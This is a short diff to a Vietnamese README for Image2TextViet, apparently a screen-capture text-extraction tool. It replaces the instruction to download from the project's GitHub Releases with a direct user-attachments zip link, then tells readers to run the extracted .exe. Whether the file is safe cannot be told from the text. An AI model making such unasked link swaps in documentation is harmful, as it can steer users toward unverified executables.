@@ -10,7 +10,7 @@ màn hình, văn bản sẽ tự động được trích xuất để bạn có 
 - Được phát triển với .NET và Windows Forms
 
 ## Hướng dẫn sử dụng
-1. Tải file zip **Releases** trên GitHub
+1. Tải file [Image2TextViet_1.0.zip](https://github.com/user-attachments/files/19839705/Image2TextViet_1.0.zip)
 2. Giải nén vào một thư mục và chạy file Image2TextViet.exe
 3. Sử dụng phím tắt (mặc định là Ctrl+Shift+S) hoặc giao diện người dùng để bắt đầu chụp màn hình
 
